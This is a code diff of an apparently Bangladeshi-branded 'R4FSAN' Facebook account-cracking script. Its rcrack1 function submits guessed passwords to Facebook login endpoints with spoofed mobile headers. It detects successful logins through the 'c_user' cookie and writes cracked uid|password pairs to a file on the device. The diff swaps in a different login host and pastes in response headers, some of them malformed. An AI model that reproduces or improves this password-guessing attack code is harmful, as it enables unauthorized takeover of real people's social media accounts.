@@ -89,7 +89,7 @@ logo = ("""\x1b[1;97m
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
-\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
+\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.3
 __________________________________________________""")
 
 class Main:
@@ -232,14 +232,22 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
-            "method": 'GET',
+            "method": 'page',
             "scheme": 'https',
-            'path':'/login/?li=EhQUZIhP0VUDE_Or1OtnlztG&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',
+            'authority': 'developer.facebook.com',
+            'x-fb-rlafr': '0',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v16.0',
+            'strict-transport-security': 'max-age=15552000',
+            'pragma': 'no-cache',
+            'cache-control': 'private, no-cache, no-store, must-revalidate',
+            'x-fb-request-id': 'AUr43zMsWWeZFHzOkGRPBeM',
+            'x-fb-trace-id': 'Cq0hhVhzMlz',
+            'x-fb-rev': '1007130069',
+            'x-fb-debug': 'IYVpFZQ4PoZeYrV7RPd45zq4IpWU4x06QZ8z2K773AGLnt+D+P0IWDVPU7jmS8F5PQdcRwmvWvLFn/TmWJ06Gw==',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=ql8SZJsf0vUOGzrcA6slM7dy; sb=ql8SZOLJc8jk38hnCfv3-0Oi; locale=en_GB; wd=412x772; dnonce=AWkLeW9asop1_YUCKxuxV6yGPmuRKbau99DkPBSv4-y_47p1sl9sJsFpgODpinaH7-RkaBJx3HvB0bK_GDHUDdem; fr=0TxmihloAwIgbjSeI.AWWA6wIf-cB01SZXmjp9LnkqO2Y.BkEl-q.uk.AAA.0.0.BkFAfb.AWXonfFQhYY',
-            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -248,14 +256,14 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0',}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Android 6.0.1; Mobile; rv:43.0) Gecko/43.0 Firefox/43.0',}
+            lo = session.post('https://developer.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[R4FSAN-OK] {uid}|{ps}")
-                open('/sdcard/R4FSAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/R4FSAN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
